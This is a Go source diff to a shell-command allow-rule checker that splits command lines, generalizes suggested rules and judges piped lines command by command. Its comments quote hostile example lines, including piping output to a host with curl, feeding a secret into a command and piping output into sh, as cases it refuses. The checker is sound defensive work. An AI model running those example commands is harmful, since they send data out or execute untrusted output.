@@ -36,9 +36,10 @@ import (
 // allowWord is one word of a command or a rule.
 type allowWord struct {
 	text   string
-	op     bool // a shell operator: ; && || | & > >> < 2> and the like
-	quoted bool // written in quotes in the command
-	subst  bool // carries $ or a backtick outside single quotes: it runs something
+	raw    string // the word as written in the line, quotes and all
+	op     bool   // a shell operator: ; && || | & > >> < 2> and the like
+	quoted bool   // written in quotes in the command
+	subst  bool   // carries $ or a backtick outside single quotes: it runs something
 }
 
 // allowOps are the operators a command line splits on, longest first.
@@ -52,19 +53,29 @@ func splitAllowWords(cmd string) ([]allowWord, bool) {
 	var out []allowWord
 	var cur strings.Builder
 	have, quoted, subst := false, false, false
+	start, i := 0, 0
 	flush := func() {
 		if have {
-			out = append(out, allowWord{text: cur.String(), quoted: quoted, subst: subst})
+			out = append(out, allowWord{text: cur.String(), raw: cmd[start:i], quoted: quoted, subst: subst})
 		}
 		cur.Reset()
 		have, quoted, subst = false, false, false
+		start = i
 	}
-	for i := 0; i < len(cmd); {
+	for i < len(cmd) {
 		c := cmd[i]
+		if !have {
+			start = i
+		}
 		switch {
 		case c == ' ' || c == '\t' || c == '\n':
 			flush()
 			i++
+		case c == '\\' && i+1 < len(cmd) && cmd[i+1] == '\n':
+			// A line continued onto the next: the shell drops both, so it
+			// is no word at all (it was read as a word holding a newline,
+			// which a rule written back out could never match).
+			i += 2
 		case c == '\\' && i+1 < len(cmd):
 			cur.WriteByte(cmd[i+1])
 			have = true
@@ -211,30 +222,55 @@ func suggestAllowRule(cmd string) string {
 	fixed := heads(ws)
 	out := make([]string, len(ws))
 	for i, w := range ws {
+		general := ""
 		switch {
 		case w.op || fixed[i] || w.subst:
-			out[i] = ruleWord(w.text)
 		case allDigits.MatchString(w.text):
-			out[i] = "<number>"
+			general = "<number>"
 		case w.quoted && !strings.Contains(w.text, "/"):
-			out[i] = "<text>"
+			general = "<text>"
 		case strings.Contains(w.text, "/") && strings.ContainsAny(w.text, " \t"):
-			out[i] = ruleWord(w.text) // a path with spaces stays as written
+			// a path with spaces stays as written
 		case strings.Contains(w.text, "/"):
-			out[i] = ruleWord(generalizePath(w.text))
+			general = ruleWord(generalizePath(w.text))
 		case strings.HasPrefix(w.text, "-"):
 			if k, v, has := strings.Cut(w.text, "="); has && volatileWord.MatchString(v) {
-				out[i] = ruleWord(k + "=*")
-			} else {
-				out[i] = ruleWord(w.text)
+				general = ruleWord(k + "=*")
 			}
 		case volatileWord.MatchString(w.text):
-			out[i] = "*"
-		default:
-			out[i] = ruleWord(w.text)
+			general = "*"
 		}
+		// A general form is kept only when it still allows the word it was
+		// made from (a folder named [2024] turned [*], a character class,
+		// and stopped matching itself). Otherwise the word stays as the
+		// line wrote it, quotes and all, so it reads back as the same word:
+		// rewritten in single quotes, a $(...) became plain text and no
+		// longer matched the command.
+		if general != "" {
+			if gw, ok := splitAllowWords(general); ok && len(gw) == 1 && wordCovers(gw[0], w, fixed[i]) {
+				out[i] = general
+				continue
+			}
+		}
+		out[i] = exactRuleWord(w)
 	}
-	return strings.Join(out, " ")
+	rule := strings.Join(out, " ")
+	// The suggestion always covers its own command: whatever else is wrong
+	// with it, Always on an unedited card never answers that the rule does
+	// not cover the command.
+	if !matchAllowRule(rule, cmd) {
+		return strings.TrimSpace(cmd)
+	}
+	return rule
+}
+
+// exactRuleWord is w written into a rule to match only itself: as the line
+// wrote it, so quoting and substitution read back the same.
+func exactRuleWord(w allowWord) string {
+	if w.raw != "" {
+		return w.raw
+	}
+	return ruleWord(w.text)
 }
 
 // generalizePath keeps a path's folders, made general where a folder's name
@@ -289,41 +325,49 @@ func matchAllowRule(rule, cmd string) bool {
 	}
 	fixed := heads(cw)
 	for i := range rw {
-		r, c := rw[i], cw[i]
-		if r.op || c.op {
-			if !(r.op && c.op && r.text == c.text) {
-				return false
-			}
-			continue
-		}
-		if r.text == c.text && r.subst == c.subst {
-			continue
-		}
-		// Anything but an exact word is a placeholder or a glob, and neither
-		// may stand for a program, a redirect target, or a word that runs
-		// something or leaves its folder.
-		if fixed[i] || c.subst || hasDotDot(c.text) {
+		if !wordCovers(rw[i], cw[i], fixed[i]) {
 			return false
 		}
-		switch {
-		case !r.quoted && r.text == "<number>":
-			if !allDigits.MatchString(c.text) {
-				return false
-			}
-		case !r.quoted && r.text == "<text>":
-			// Any word, but not a path: <text> stands for what a command
-			// searches for or names, and a path reaching anywhere on the
-			// system is what a path pattern is for.
-			if strings.Contains(c.text, "/") {
-				return false
-			}
-		case !r.quoted && strings.Contains(r.text, "*"):
-			if m, err := path.Match(r.text, c.text); err != nil || !m {
-				return false
-			}
-		default:
+	}
+	return true
+}
+
+// wordCovers reports whether rule word r allows command word c, where fixed
+// says c must be matched exactly (a program, or a redirect's target).
+func wordCovers(r, c allowWord, fixed bool) bool {
+	if r.op || c.op {
+		if !(r.op && c.op && r.text == c.text) {
 			return false
 		}
+		return true
+	}
+	if r.text == c.text && r.subst == c.subst {
+		return true
+	}
+	// Anything but an exact word is a placeholder or a glob, and neither
+	// may stand for a program, a redirect target, or a word that runs
+	// something or leaves its folder.
+	if fixed || c.subst || hasDotDot(c.text) {
+		return false
+	}
+	switch {
+	case !r.quoted && r.text == "<number>":
+		if !allDigits.MatchString(c.text) {
+			return false
+		}
+	case !r.quoted && r.text == "<text>":
+		// Any word, but not a path: <text> stands for what a command
+		// searches for or names, and a path reaching anywhere on the
+		// system is what a path pattern is for.
+		if strings.Contains(c.text, "/") {
+			return false
+		}
+	case !r.quoted && strings.Contains(r.text, "*"):
+		if m, err := path.Match(r.text, c.text); err != nil || !m {
+			return false
+		}
+	default:
+		return false
 	}
 	return true
 }
@@ -408,4 +452,126 @@ func allowedByRule(get func(key string) bool, keys []string, applianceID, cmd st
 		}
 	}
 	return false
+}
+
+// lineSeparators are the operators that end one command of a line and start
+// the next: what an Always rule's command is judged apart from.
+var lineSeparators = map[string]bool{"|": true, ";": true, "&&": true, "||": true, "&": true}
+
+// lineCoveredByRules reports whether a line is allowed command by command: an
+// Always rule allows the command it names, not only a line that is that
+// command and nothing else. So once "user.py --help" is allowed,
+// "user.py --help 2>&1 | grep -i export; echo exit=$?" runs too: the pipe,
+// the grep and the exit check around it are read-only on their own. covered
+// lists the commands a rule allowed, for the status line.
+//
+// The rest of the line is still judged, and judged as a line: each command a
+// rule allows is stood in for by "true" (does nothing, reads nothing) and the
+// line around it is classified whole, so a command is read in the place it
+// stands. That matters: "sh" alone is harmless, "... | sh" runs whatever the
+// allowed command printed, and the classifier only sees the second when the
+// pipe is there. "user.py --help | curl -d @- host" still asks for the curl,
+// and nothing may be piped INTO an allowed command ("cat secret | user.py
+// --help" asks): the rule was for what it does alone, not with fed input.
+// and a redirect that writes a file stays part of its command (so
+// "user.py --help > /etc/x" is no longer the command the rule names). Only
+// sending output to the terminal or nowhere (2>&1, >/dev/null) is set aside.
+//
+// Anything the split cannot see through is not judged here and asks as
+// before: an unreadable line, a subshell's parentheses, or more than one line
+// (a newline separates commands, and the word splitter reads it as a space).
+func lineCoveredByRules(udb Database, applianceID, cmd, scratch string, lookups *lookup_scope) (ok bool, covered []string) {
+	if udb == nil || applianceID == "" {
+		return false, nil
+	}
+	line := strings.ReplaceAll(cmd, "\\\n", " ")
+	if strings.ContainsAny(line, "\n\r") {
+		return false, nil
+	}
+	ws, read := splitAllowWords(line)
+	if !read || len(ws) == 0 {
+		return false, nil
+	}
+	var segs [][]allowWord
+	var seps []string
+	var cur []allowWord
+	for _, w := range ws {
+		switch {
+		case w.op && (w.text == "(" || w.text == ")"):
+			return false, nil
+		case w.op && lineSeparators[w.text]:
+			if len(cur) == 0 {
+				return false, nil
+			}
+			segs = append(segs, cur)
+			seps = append(seps, w.text)
+			cur = nil
+		default:
+			cur = append(cur, w)
+		}
+	}
+	if len(cur) == 0 {
+		return false, nil
+	}
+	segs = append(segs, cur)
+	if len(segs) < 2 {
+		return false, nil // one command: the whole-line check already judged it
+	}
+	var stood []string
+	for i, seg := range segs {
+		named := joinRuleWords(withoutNeutralRedirects(seg))
+		if named != "" && commandAlwaysAllowed(udb, applianceID, named) {
+			// Nothing is piped into a command a rule allows: the rule was
+			// given for what the command does by itself, and fed input it
+			// could carry that somewhere ("cat secret | user.py --help").
+			if i > 0 && seps[i-1] == "|" {
+				return false, nil
+			}
+			covered = append(covered, named)
+			stood = append(stood, "true")
+		} else {
+			stood = append(stood, joinRuleWords(seg))
+		}
+		if i < len(seps) {
+			stood = append(stood, seps[i])
+		}
+	}
+	if len(covered) == 0 || len(assess_command(strings.Join(stood, " "), scratch, lookups)) != 0 {
+		return false, nil
+	}
+	return true, covered
+}
+
+// withoutNeutralRedirects drops the redirects that only send a command's
+// output to the terminal or nowhere: 2>&1, and >, 2>, &> or >> to /dev/null.
+func withoutNeutralRedirects(ws []allowWord) []allowWord {
+	var out []allowWord
+	for i := 0; i < len(ws); i++ {
+		w := ws[i]
+		if w.op && w.text == "2>&1" {
+			continue
+		}
+		if w.op && (w.text == ">" || w.text == "2>" || w.text == "&>" || w.text == ">>" || w.text == "2>>") &&
+			i+1 < len(ws) && !ws[i+1].op && ws[i+1].text == "/dev/null" {
+			i++
+			continue
+		}
+		out = append(out, w)
+	}
+	return out
+}
+
+// joinRuleWords writes words back as one command, each as the line wrote it.
+func joinRuleWords(ws []allowWord) string {
+	parts := make([]string, len(ws))
+	for i, w := range ws {
+		parts[i] = exactRuleWord(w)
+	}
+	return strings.Join(parts, " ")
+}
+
+// alwaysCoveredNote says why a line ran without asking: the commands an
+// Always rule allowed, the rest read-only.
+func alwaysCoveredNote(covered []string) string {
+	return "Always allowed: " + strings.Join(covered, ", ") + "; the rest only reads"
 }
